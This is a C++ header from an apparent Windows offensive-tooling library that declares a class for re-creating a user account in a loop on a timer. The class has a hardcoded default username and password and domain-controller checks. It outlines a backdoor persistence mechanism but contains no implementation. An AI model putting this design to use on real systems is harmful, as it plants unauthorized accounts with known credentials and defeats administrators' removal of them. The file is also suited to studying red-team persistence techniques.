#ifndef IROH_IROHLIBRARY_IROH_USER_H
#define IROH_IROHLIBRARY_IROH_USER_H

#pragma comment(lib, "Netapi32.lib")

#include<Windows.h>
#include <DSRole.h>
#include <LM.h>

#include <string>

#define DEFAULT_USERNAME L"Iroh"
#define DEFAULT_PASSWORD L"Password-123!"
#define DEFAULT_SLEEPTIMER 15000

namespace Iroh {

	// IrohUser class creates the set user repeatedly on the sleep timer.
	// This class will halt code execution if the sleep is not set to zero and
	// should be called in a thread if the sleep time is not greater than zero.
	class IrohUser
	{
	public:	
		IrohUser();

		// Sets the username of the user.
		VOID SetUsername(std::string);

		// Sets the password of the user. Must meet Windows Password requirements.
		VOID SetPassword(std::string);

		// Sets the sleep time between checks.
		VOID SetSleepTime(INT);

		// Starts the execution, make sure to call in a thread if you want 
		// continued code execution.
		VOID Start();

	private:
		std::wstring username;
		std::wstring password;
		INT sleepTime;

		// Calls upon the CreatePersistentUser function and then 
		// sleeps for the set time.
		VOID UserLoop();

		// Creates a user with the set information.
		VOID CreatePersistentUser();

		// Checks if the machine is a domain controller.
		BOOL IsDomainController();

		// Gets and returns the domain name.
		std::wstring GetDomainName();

	};

}

#endif // !IROH_IROHLIBRARY_IROH_USER_H
